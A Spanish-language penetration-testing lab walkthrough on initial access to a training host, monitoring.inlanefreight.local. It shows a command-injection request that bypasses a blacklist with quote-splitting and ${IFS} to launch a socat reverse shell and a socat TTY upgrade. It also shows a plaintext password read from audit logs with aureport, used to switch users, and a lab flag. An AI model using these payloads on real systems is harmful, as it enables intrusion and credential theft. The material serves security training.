
# Acceso inicial

Ahora que hemos enumerado y analizado exhaustivamente el perímetro externo y hemos descubierto numerosos hallazgos, estamos listos para cambiar de rumbo y centrarnos en obtener un acceso estable a la red interna.&#x20;

Según el documento SoW, si logramos establecernos internamente, el cliente desea que veamos hasta dónde podemos llegar, incluyendo el acceso al nivel de `Domain Admin` . En la última sección, nos esforzamos por analizar las capas e identificar aplicaciones web que provocaban lecturas de archivos o ejecución remota de código, pero que no nos permitían acceder a la red interna.&#x20;

Terminamos con la obtención de RCE en la aplicación `monitoring.inlanefreight.local` después de una dura batalla contra los filtros y listas negras establecidos para tratar de prevenir ataques de Command Injection.

***

## <mark style="color:purple;">Obtener un Reverse Shell</mark>

Como se mencionó en la sección anterior, podemos usar [Socat](https://linux.die.net/man/1/socat) para establecer una conexión de reverse shell. Nuestro comando base será el siguiente, pero necesitaremos ajustarlo un poco para bypassear el filtro de espacios y de ejecución de comandos:

```shell-session
socat TCP4:10.10.14.5:8443 EXEC:/bin/bash
```

Podemos modificar este comando para que nos dé un payload útil para capturar un reverse shell.

```http
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://monitoring.inlanefreight.local/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ntpou9fdf13i90mju7lcrp3f06
Connection: close
```

Inicia un listener `Netcat` en el puerto usado en el comando Socat (8443 aquí) y ejecuta la solicitud anterior en Burp Repeater. Si todo sale según lo previsto, tendremos un reverse shell como el usuario `webdev`.

```shell-session
afsh4ck@kali$ nc -nvlp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 51496
$ id
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm) 
```

## <mark style="color:purple;">TTY Spawn Shell</mark>

A continuación, necesitaremos actualizar a un `TTY Interactivo`. Esta [publicación](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) describe algunos métodos. Podríamos usar un método que también se trató en la sección "[Tratamiento de la TTY](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/shells-y-payloads/tratamiento-de-la-tty.md)" , ejecutando el conocido comando de una sola línea de Python (`python3 -c 'import pty; pty.spawn("/bin/bash")'`) para generar una pseudoterminal. Pero vamos a intentar algo un poco diferente usando `Socat`. El objetivo es obtener una terminal adecuada para poder ejecutar comandos como `su`, `sudo`, `ssh`, `usar el autocompletado de comandos` o `abrir un editor de texto si se necesita`.

Iniciaremos un listener Socat en nuestro host de ataque.

```shell-session
afsh4ck@kali$ socat file:`tty`,raw,echo=0 tcp-listen:4443
```

A continuación, ejecutaremos una línea Socat en el host de destino.

```shell-session
afsh4ck@kali$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

Si todo va según lo previsto, tendremos una conexión de reverse shell estable en nuestro listener Socat.

```shell-session
webdev@dmz01:/var/www/html/monitoring$ id

uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
webdev@dmz01:/var/www/html/monitoring$
```

Ahora que tenemos una reverse shell estable, podemos empezar a explorar el sistema de archivos. Los resultados del comando `id` son inmediatamente interesantes. La sección "[Grupos Privilegiados](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios/escalada-de-privilegios-en-linux/grupos-privilegiados.md)" muestra un ejemplo de usuarios del grupo `adm` con permisos para leer TODOS los registros almacenados en `/var/log`. Quizás podamos encontrar algo interesante allí.&#x20;

Podemos usar [aureport](https://linux.die.net/man/8/aureport) para leer registros de auditoría en sistemas Linux. La página del manual lo describe como "aureport es una herramienta que genera informes resumidos de los registros de auditoría del sistema".

```shell-session
webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less

Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
WARNING: terminal is not fully functional
-  (press RETURN)
TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
```

Después de ejecutar el comando, escribe `q` para volver a la shell. Según el resultado anterior, parece que un usuario intentaba autenticarse como el usuario `srvadm` y tenemos un posible par de credenciales `srvadm:ILFreightnixadm!`. Con el comando, `su` podemos autenticarnos como el usuario `srvadm`.

```shell-session
webdev@dmz01:/var/www/html/monitoring$ su srvadm

Password: 
$ id

uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
$ /bin/bash -i

srvadm@dmz01:/var/www/html/monitoring$
```

Ahora que hemos evitado el filtrado intensivo para lograr la inyección de comandos, hemos convertido la ejecución de código en un reverse shell y hemos escalado nuestros privilegios a otro usuario, no queremos perder el acceso a este host.&#x20;

En la siguiente sección, trabajaremos para lograr la persistencia, idealmente después de escalar los privilegios a `root`.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.229.147
```

### Pregunta 1

> Envíe el contenido del archivo flag.txt en el directorio /home/srvadm.

#### Conseguir una TTY Shell estable con Socat

Tenemos una shell limitada, por lo que vamos a ganar una shell interactiva. Para ello:

1. Iniciaremos un listener Socat en nuestro Kali Linux.

```shell-session
afsh4ck@kali$ socat file:`tty`,raw,echo=0 tcp-listen:4443
```

2. A continuación, ejecutaremos una línea Socat en el host de destino.

```shell-session
afsh4ck@kali$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.203.111] 52174

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443
```

3. Recibimos una reverse shell estable en nuestro listener Socat

<figure><img src="/files/p3YM1gMXcy1vNgRvNKAA" alt=""><figcaption></figcaption></figure>

### Acceso a la flag

```shell-session
webdev@dmz01:/var/www/html/monitoring$ cd /home/srvadm
webdev@dmz01:/home/srvadm$ ls
flag.txt
webdev@dmz01:/home/srvadm$ cat flag.txt 
b447c27a00e3a348881b0************
```

### Obtener credenciales

```shell-session
webdev@dmz01:/home/lab_adm$ aureport --tty | less

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
```

Tenemos la contraseña de `srvadmin:ILFreightnixadm!`. Lo usaremos en la siguiente sección para obtener persistencia.
